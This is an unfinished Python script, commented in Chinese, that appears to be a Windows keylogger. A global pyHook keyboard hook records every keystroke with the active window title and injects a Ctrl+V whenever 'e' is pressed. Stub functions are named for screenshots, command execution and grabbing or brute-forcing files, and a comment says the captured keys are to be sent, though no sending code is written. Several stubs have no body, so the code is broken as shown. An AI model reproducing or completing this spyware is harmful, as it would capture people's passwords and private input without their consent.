# -*- coding:utf-8 -*-
from ctypes import *
import pyHook
import threading
from PIL import ImageGrab
import pythoncom
import win32api
import win32con
from PIL import Image
import pytesseract
import socket
currenttitle=''
lasttitle=''
jilu=[]
def getlocaldir():
	#获得当前路径
	pass
def getlocalfiledir():
	#获取当前路径下文件
def getthetopfiledir():
	#获取上届路径文件目录
def getfile(path,name):
	#获取文件
def boomwenjian(path):
	#爆破并获得指定目录下文件
def jietu():
	pass
	#获取截图
def cmd():
	pass
	#cmd命令 
#键盘事件处理，并且发送
def onKeyboardEvent(event):
    global s
    global jilu
    global currenttitle
    global lasttitle
    windowTitle = create_string_buffer(512)
    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)
    currenttitle= windowTitle.value.decode('gbk')
    c = chr(event.Ascii)
    #如果是e
    if(c=='e'):
        #模拟事件  Conyrol+V，完成复制功能
        win32api.keybd_event(17, 0, 0, 0)  # ctrl键位码是17
        win32api.keybd_event(86, 0, 0, 0)  # v键位码是86
        win32api.keybd_event(86, 0, win32con.KEYEVENTF_KEYUP, 0)  # 释放按键
        win32api.keybd_event(17, 0, win32con.KEYEVENTF_KEYUP, 0)
    if(currenttitle!=lasttitle):
        jilu=[]
        jilu.append(currenttitle)
    jilu.append(c)
    print("you last letter",chr(event.Ascii))
    lasttitle = windowTitle.value.decode('gbk')
    return True

#键盘事件，截获，处理的是上个def函数，onKeyboardEvent
def jianpan():
    try :
        hm = pyHook.HookManager()
        hm.KeyDown = onKeyboardEvent #这里是键盘落下，事件绑定与onKeyboardEvent函数
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    except Exception:
        return
threads=[]
t2 = threading.Thread(target=jianpan)
threads.append(t2)
for i in  threads:
    i.start()